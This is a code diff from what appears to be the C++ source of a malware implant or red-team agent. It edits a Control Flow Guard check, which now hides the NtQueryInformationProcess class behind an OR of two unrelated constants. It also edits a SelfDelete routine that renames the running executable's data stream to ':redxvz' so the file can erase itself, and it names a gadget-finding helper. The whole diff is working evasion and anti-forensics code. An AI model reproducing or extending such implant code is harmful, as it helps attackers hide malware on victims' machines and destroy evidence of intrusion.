@@ -76,20 +76,20 @@ auto DECLFN Useful::CfgPrivAdd(
 }
 
 auto DECLFN Useful::CfgCheck( VOID ) -> BOOL {
-    NTSTATUS Status = STATUS_SUCCESS;
-    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY CfgPolicy = { 0 };
+    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };
+    NTSTATUS                     NtStatus   = STATUS_SUCCESS;
 
-    Status = Self->Ntdll.NtQueryInformationProcess( 
-        NtCurrentProcess(), ProcessMitigationPolicy, &CfgPolicy, sizeof( CfgPolicy ), nullptr
-    );
+    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
+    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
 
-    if ( Status != STATUS_SUCCESS ) {
-        KhDbg( "failed with status: %X", Status );
-        return FALSE;
-    }
+    if ( ! NT_SUCCESS( NtStatus = Self->Ntdll.NtQueryInformationProcess(
+        NtCurrentProcess(), ProcessCookie | ProcessUserModeIOPL, &ProcInfoEx, sizeof( ProcInfoEx ), nullptr )
+    ) ) {
+        KhDbg( "NtQueryInformationProcess Failed => %p", NtStatus ); return FALSE; 
+    } 
 
-    KhDbg( "Control Flow Guard (CFG) Enabled: %s", CfgPolicy.EnableControlFlowGuard ? "TRUE" : "FALSE" );
-    return CfgPolicy.EnableControlFlowGuard;
+    KhDbg( "Control Flow Guard Policy Enabled = %s", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
+    return ProcInfoEx.ExtendedProcessInfoBuffer;
 }
 
 auto DECLFN Useful::FindGadget(
@@ -181,7 +181,7 @@ auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
     const auto NewStream  = L":redxvz";
     const auto StreamSize = Str::LengthW( NewStream ) * sizeof(WCHAR);
     const auto RenameSize = sizeof(FILE_RENAME_INFO) + StreamSize;
-    const auto RenamePtr  = (PFILE_RENAME_INFO)hAlloc( RenameSize ); 
+    const auto RenamePtr  = (PFILE_RENAME_INFO)KhAlloc( RenameSize ); 
     if ( ! RenamePtr ) { return FALSE; }
 
     RenamePtr->FileNameLength  = StreamSize;
@@ -210,7 +210,7 @@ auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
     KhDbg("[+] Self file deletion succefully\n");
 
     Self->Ntdll.NtClose( FileHandle );
-    if ( RenamePtr ) hFree( RenamePtr );
+    if ( RenamePtr ) KhFree( RenamePtr );
 
     return TRUE;
 }
